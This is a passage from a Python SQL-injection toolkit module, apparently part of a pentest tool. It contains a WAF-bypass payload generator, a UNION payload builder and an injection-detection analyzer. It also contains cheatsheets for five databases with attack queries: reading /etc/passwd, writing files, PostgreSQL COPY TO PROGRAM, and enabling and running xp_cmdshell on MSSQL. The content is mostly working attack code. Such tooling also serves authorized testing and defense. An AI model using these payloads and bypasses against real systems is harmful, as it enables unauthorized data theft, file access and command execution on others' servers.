            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif encoding == EncodingType.HEX:
            return "0x" + payload.encode().hex()
        elif encoding == EncodingType.UNICODE:
            return "".join([f"\\u{ord(c):04x}" for c in payload])
        elif encoding == EncodingType.CHAR:
            # MySQL CHAR() encoding
            return "CHAR(" + ",".join(str(ord(c)) for c in payload) + ")"
        return payload

    def generate_waf_bypass_variants(self, payload: str) -> List[str]:
        """
        Generate WAF bypass variants of a payload.

        Args:
            payload: Original SQL injection payload

        Returns:
            List of bypass variants
        """
        variants = [payload]

        # Case variations
        variants.append(
            payload.replace("SELECT", "SeLeCt")
            .replace("UNION", "UnIoN")
            .replace("FROM", "FrOm")
            .replace("WHERE", "WhErE")
        )

        # Space alternatives
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", "%09"))  # Tab
        variants.append(payload.replace(" ", "%0a"))  # Newline
        variants.append(payload.replace(" ", "%0d"))  # Carriage return
        variants.append(payload.replace(" ", "+"))

        # MySQL comment bypass
        variants.append(payload.replace(" ", "/*!50000*/"))
        variants.append(payload.replace("SELECT", "/*!50000SELECT*/"))
        variants.append(payload.replace("UNION", "/*!50000UNION*/"))

        # URL encoding
        variants.append(urllib.parse.quote(payload))

        # Double URL encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # Unicode normalization - fullwidth characters
        variants.append(payload.replace("'", "%ef%bc%87"))  # Fullwidth apostrophe
        variants.append(payload.replace(" ", "%e2%80%80"))  # Non-breaking space

        # NULL byte injection
        variants.append(payload.replace("'", "%00'"))

        # Concatenation bypass
        if "SELECT" in payload:
            variants.append(payload.replace("SELECT", "SEL" + "/**/ECT"))

        return list(set(variants))  # Remove duplicates

    def generate_union_payload(
        self,
        columns: int,
        db_type: DBType = DBType.MYSQL,
        extraction: Optional[str] = None,
    ) -> str:
        """
        Generate UNION-based payload for a specific column count.

        Args:
            columns: Number of columns to match
            db_type: Target database type
            extraction: Optional data to extract (e.g., "@@version")

        Returns:
            UNION SELECT payload string
        """
        nulls = ["NULL"] * columns

        if extraction:
            # Replace first NULL with extraction query
            nulls[0] = extraction

        payload = " UNION SELECT " + ",".join(nulls)

        # Add comment terminator based on database
        if db_type in (DBType.MYSQL, DBType.MSSQL, DBType.POSTGRESQL):
            payload += "--"
        elif db_type == DBType.ORACLE:
            payload += " FROM dual--"

        return payload

    def detect_database_type(self, response: str) -> Optional[DBType]:
        """
        Detect database type from error message.

        Args:
            response: HTTP response body

        Returns:
            Detected DBType or None
        """
        for pattern, db_type in self._error_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                return db_type
        return None

    def analyze_response(
        self,
        original_response: str,
        modified_response: str,
        payload: str,
        response_time: Optional[float] = None,
    ) -> Optional[SQLInjectionFinding]:
        """
        Analyze if response indicates SQL injection.

        Args:
            original_response: Response without injection
            modified_response: Response with injection payload
            payload: The payload that was used
            response_time: Response time in seconds (for time-based detection)

        Returns:
            SQLInjectionFinding if vulnerable, None otherwise
        """
        # Check for error-based detection
        db_type = self.detect_database_type(modified_response)
        if db_type:
            return SQLInjectionFinding(
                url="",
                parameter="",
                technique=SQLITechnique.ERROR_BASED,
                db_type=db_type,
                payload=payload,
                evidence=f"Database error pattern detected: {db_type.value}",
                severity="Critical",
                response_time=response_time,
            )

        # Check for time-based detection
        if response_time and response_time > 4.5:  # Threshold for 5-second delays
            return SQLInjectionFinding(
                url="",
                parameter="",
                technique=SQLITechnique.BLIND_TIME,
                db_type=DBType.GENERIC,
                payload=payload,
                evidence=f"Response delayed by {response_time:.2f} seconds",
                severity="Critical",
                response_time=response_time,
            )

        # Check for boolean-based (significant content difference)
        if len(original_response) != len(modified_response):
            diff_ratio = abs(len(original_response) - len(modified_response)) / max(
                len(original_response), 1
            )
            if diff_ratio > 0.5:  # More than 50% difference
                return SQLInjectionFinding(
                    url="",
                    parameter="",
                    technique=SQLITechnique.BLIND_BOOLEAN,
                    db_type=DBType.GENERIC,
                    payload=payload,
                    evidence=f"Response length changed by {diff_ratio*100:.1f}%",
                    severity="High",
                    response_time=response_time,
                )

        return None

    def get_cheatsheet(self, db_type: DBType) -> str:
        """
        Get SQL injection cheatsheet for a database.

        Args:
            db_type: Database type

        Returns:
            Cheatsheet string
        """
        cheatsheets = {
            DBType.MYSQL: """
MySQL SQL Injection Cheatsheet
==============================

Comments:
  -- - (space required after --)
  #
  /* */

Version:
  SELECT @@version
  SELECT version()

User:
  SELECT user()
  SELECT system_user()
  SELECT session_user()

Database:
  SELECT database()
  SELECT schema()

String Concatenation:
  SELECT CONCAT('a','b')
  SELECT 'a' 'b'

Substrings:
  SELECT SUBSTRING('abc',1,1)
  SELECT MID('abc',1,1)

ASCII:
  SELECT ASCII('A')
  SELECT ORD('A')

Length:
  SELECT LENGTH('abc')

Conditional:
  SELECT IF(1=1,'true','false')
  SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END

Time Delay:
  SELECT SLEEP(5)
  SELECT BENCHMARK(1000000,MD5(1))

File Operations:
  SELECT LOAD_FILE('/etc/passwd')
  SELECT 'content' INTO OUTFILE '/tmp/file'

Information Schema:
  SELECT table_name FROM information_schema.tables
  SELECT column_name FROM information_schema.columns WHERE table_name='users'
""",
            DBType.POSTGRESQL: """
PostgreSQL SQL Injection Cheatsheet
====================================

Comments:
  --
  /* */

Version:
  SELECT version()

User:
  SELECT current_user
  SELECT session_user
  SELECT user

Database:
  SELECT current_database()

String Concatenation:
  SELECT 'a' || 'b'
  SELECT CONCAT('a','b')

Substrings:
  SELECT SUBSTRING('abc',1,1)
  SELECT substr('abc',1,1)

ASCII:
  SELECT ASCII('A')

Time Delay:
  SELECT pg_sleep(5)
  SELECT (SELECT COUNT(*) FROM generate_series(1,10000000))

File Operations:
  SELECT pg_read_file('postgresql.conf')
  COPY (SELECT '') TO '/tmp/file'

Command Execution:
  COPY (SELECT '') TO PROGRAM 'id'

Information Schema:
  SELECT table_name FROM information_schema.tables
  SELECT column_name FROM information_schema.columns
""",
            DBType.MSSQL: """
MSSQL SQL Injection Cheatsheet
==============================

Comments:
  --
  /* */

Version:
  SELECT @@version

User:
  SELECT SYSTEM_USER
  SELECT CURRENT_USER
  SELECT SUSER_SNAME()

Database:
  SELECT DB_NAME()

String Concatenation:
  SELECT 'a' + 'b'
  SELECT CONCAT('a','b')

Substrings:
  SELECT SUBSTRING('abc',1,1)

ASCII:
  SELECT ASCII('A')

Time Delay:
  WAITFOR DELAY '0:0:5'
  WAITFOR TIME '12:00:00'

Command Execution:
  EXEC xp_cmdshell 'whoami'
  -- Enable xp_cmdshell:
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE

Information Schema:
  SELECT table_name FROM information_schema.tables
  SELECT name FROM sysobjects WHERE xtype='U'
  SELECT name FROM master.dbo.sysdatabases
""",
            DBType.ORACLE: """
Oracle SQL Injection Cheatsheet
===============================

Comments:
  --
  /* */

Version:
  SELECT banner FROM v$version WHERE rownum=1
  SELECT version FROM v$instance

User:
  SELECT user FROM dual
  SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual

Database:
  SELECT name FROM v$database
  SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual

String Concatenation:
  SELECT 'a' || 'b' FROM dual
  SELECT CONCAT('a','b') FROM dual

Substrings:
  SELECT SUBSTR('abc',1,1) FROM dual

ASCII:
  SELECT ASCII('A') FROM dual

Time Delay:
  SELECT DBMS_LOCK.SLEEP(5) FROM dual
  SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',5) FROM dual

Information Schema:
  SELECT table_name FROM all_tables
  SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
""",
            DBType.SQLITE: """
SQLite SQL Injection Cheatsheet
===============================

Comments:
  --
  /* */

Version:
  SELECT sqlite_version()

Tables:
  SELECT tbl_name FROM sqlite_master WHERE type='table'
  SELECT sql FROM sqlite_master WHERE type='table'

Columns:
  PRAGMA table_info(table_name)

String Concatenation:
  SELECT 'a' || 'b'

Substrings:
  SELECT SUBSTR('abc',1,1)

ASCII:
  SELECT UNICODE('A')

File Operations (if ATTACH is available):
  ATTACH DATABASE '/tmp/db.sqlite' AS pwned
""",
        }

        return cheatsheets.get(db_type, "Cheatsheet not available for this database")

    def get_all_raw_payloads(
        self,
        db_type: Optional[DBType] = None,
    ) -> List[str]:
        """
        Get all raw payload strings (without metadata).

        Args:
            db_type: Optional database type filter

        Returns:
            List of payload strings
        """
        return [p.payload for p in self.get_payloads(db_type=db_type)]


# Convenience exports
__all__ = [
    "SQLInjectionDB",
    "SQLPayload",
    "SQLInjectionFinding",
    "DBType",
    "SQLITechnique",
    "EncodingType",
]
